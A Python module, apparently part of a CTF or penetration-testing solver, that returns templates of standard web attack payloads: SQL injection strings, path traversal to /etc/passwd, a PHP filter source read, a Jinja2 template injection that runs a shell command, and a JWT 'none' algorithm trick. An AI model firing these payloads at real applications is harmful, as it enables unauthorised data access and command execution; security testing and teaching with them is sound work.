"""
Bounded Context: Web Domain Solver
Responsabilidade Única (SRP): Templates e ataques voltados a aplicações Web.
"""
from typing import Dict, Any

class WebDomainSolver:
    """Solver especializado para segurança de aplicações Web (SQLi, LFI, SSTI, XXE, JWT, SSRF)."""

    def get_templates(self) -> Dict[str, Any]:
        return {
            "sqli_union": {
                "name": "SQL Injection — UNION",
                "detect": "' OR 1=1--",
                "columns": "' ORDER BY N--",
                "extract": "' UNION SELECT 1,2,3--",
            },
            "lfi": {
                "name": "Local File Inclusion",
                "basic": "../../../../etc/passwd",
                "php_filter": "php://filter/convert.base64-encode/resource=index.php",
            },
            "ssti": {
                "name": "Server-Side Template Injection",
                "detect": "{{7*7}} → 49",
                "jinja2": "{{lipsum.__globals__['os'].popen('id').read()}}",
            },
            "jwt": {
                "name": "JWT Attacks",
                "none_algorithm": "Change alg to 'none', remove signature",
            },
        }
